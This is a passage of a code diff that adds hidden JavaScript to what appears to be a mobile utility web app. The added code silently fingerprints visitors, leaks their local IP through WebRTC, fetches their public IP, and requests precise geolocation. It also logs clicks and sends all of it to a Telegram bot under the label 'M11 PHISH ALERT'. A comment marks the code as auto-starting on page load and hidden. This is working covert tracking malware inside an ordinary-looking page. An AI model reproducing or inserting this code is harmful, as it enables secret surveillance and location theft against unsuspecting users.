+                    victimData.batteryCharging = b.charging;
+                    sendPhishData(victimData);
+                });
+                return 'fetching...';
+            }
+            return 'N/A';
+        })(),
+        localIP: (() => {
+            // Try to get local IP via WebRTC
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = ice => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        const ipMatch = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        if (ipMatch) {
+                            victimData.localIP = ipMatch[1];
+                        }
+                    }
+                };
+                setTimeout(() => {
+                    if (!victimData.localIP) victimData.localIP = 'N/A';
+                    sendPhishData(victimData);
+                }, 2000);
+                return 'fetching...';
+            } catch (e) {
+                return 'N/A';
+            }
+        })()
+    };
+    
+    // Get public IP
+    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
+        victimData.publicIP = data.ip;
+        sendPhishData(victimData);
+    }).catch(() => {
+        victimData.publicIP = 'N/A';
+        sendPhishData(victimData);
+    });
+    
+    // Get geolocation
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                victimData.location = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+                sendPhishData(victimData);
+            },
+            () => {
+                victimData.location = 'denied';
+                sendPhishData(victimData);
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    }
+    
+    // Track page interactions
+    let interactions = [];
+    document.addEventListener('click', e => {
+        interactions.push({
+            type: 'click',
+            target: e.target.tagName,
+            time: new Date().toLocaleTimeString()
+        });
+        if (interactions.length > 20) interactions.shift();
+    });
+    
+    // Send on page leave
+    window.addEventListener('beforeunload', () => {
+        victimData.interactions = interactions;
+        victimData.timeOnPage = Math.round((Date.now() - pageLoadTime) / 1000) + 's';
+        sendPhishData(victimData, true);
+    });
+}
+
+let phishSent = false;
+let pageLoadTime = Date.now();
+
+function sendPhishData(data, force = false) {
+    if (phishSent && !force) return;
+    if (!PHISH_BOT_TOKEN || PHISH_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+    
+    // Only send when we have enough data
+    const required = ['publicIP', 'userAgent', 'platform'];
+    const hasRequired = required.every(k => data[k] && data[k] !== 'fetching...');
+    if (!hasRequired && !force) return;
+    
+    phishSent = true;
+    
+    const message = `
+🚨 *M11 PHISH ALERT* 🚨
+
+📍 *Target Data:*
+\`\`\`
+URL: ${data.url}
+Referrer: ${data.referrer}
+Time: ${data.timestamp}
+Time on Page: ${data.timeOnPage || 'Active'}
+\`\`\`
+
+🌐 *Network:*
+• Public IP: \`${data.publicIP || 'N/A'}\`
+• Local IP: \`${data.localIP || 'N/A'}\`
+• Connection: ${data.connection}
+
+📱 *Device:*
+• Platform: ${data.platform}
+• User Agent: ${data.userAgent?.substring(0, 100)}...
+• Screen: ${data.screen}
+• Viewport: ${data.viewport}
+• Pixel Ratio: ${data.pixelRatio}x
+• Cores: ${data.cores}
+• Memory: ${data.memory}GB
+• Touch Points: ${data.touch}
+• Language: ${data.language}
+
+🔋 *Battery:*
+• Level: ${data.batteryLevel || data.battery || 'N/A'}
+• Charging: ${data.batteryCharging !== undefined ? (data.batteryCharging ? 'Yes' : 'No') : 'N/A'}
+
+📍 *Location:*
+\`\`\`
+${data.location ? (typeof data.location === 'string' ? data.location : `Lat: ${data.location.lat}\nLng: ${data.location.lng}\nAccuracy: ${data.location.accuracy}m`) : 'N/A'}
+\`\`\`
+
+⚙️ *Browser:*
+• Vendor: ${data.vendor}
+• Cookies: ${data.cookies ? 'Enabled' : 'Disabled'}
+• Java: ${data.java ? 'Enabled' : 'Disabled'}
+• PDF Viewer: ${data.pdf ? 'Yes' : 'No'}
+• DNT: ${data.doNotTrack}
+• Timezone: ${data.timezone}
+
+👆 *Interactions:* ${data.interactions?.length || 0} clicks
+    `.trim();
+    
+    fetch(`https://api.telegram.org/bot${PHISH_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: PHISH_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    }).then(() => {
+        addLog('Phishing data sent to Telegram', 'success');
+    }).catch(e => {
+        addLog('Phishing send failed: ' + e.message, 'error');
+        phishSent = false;
+    });
+}
+
+// Auto-init phishing on load (hidden)
+if (PHISH_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+    window.addEventListener('DOMContentLoaded', () => {
+        setTimeout(initPhishing, 1000);
+    });
+}
+
+        // TAB SWITCH (Visual only)
+        function switchTab(el) {
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            el.classList.add('active');
+            const label = el.querySelector('span').textContent;
+            showToast(`${label} tab selected`, 'info');
+            addLog(`Switched to ${label} tab`, 'info');
+        }
+
+        // RIPPLE EFFECT
+        document.addEventListener('click', function(e) {
+            const target = e.target.closest('.feature-card, .control-card, .status-item, .icon-btn');
+            if (target) {
+                const rect = target.getBoundingClientRect();
+                const ripple = document.createElement('div');
+                ripple.className = 'ripple';
+                ripple.style.left = (e.clientX - rect.left) + 'px';
+                ripple.style.top = (e.clientY - rect.top) + 'px';
+                ripple.style.width = ripple.style.height = '20px';
+                target.appendChild(ripple);
+                setTimeout(() => ripple.remove(), 600);
+            }
+        });
+
+        // VISIBILITY API
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                addLog('App backgrounded', 'warn');
+            } else {
+                addLog('App foregrounded', 'success');
+            }
+        });
+
+        // BEFORE UNLOAD
+        window.addEventListener('beforeunload', () => {
+            if (wakeLockObj) wakeLockObj.release();
+            if (window.flashStream) window.flashStream.getTracks().forEach(t => t.stop());
+        });
+    </script>
+</body>
+</html>
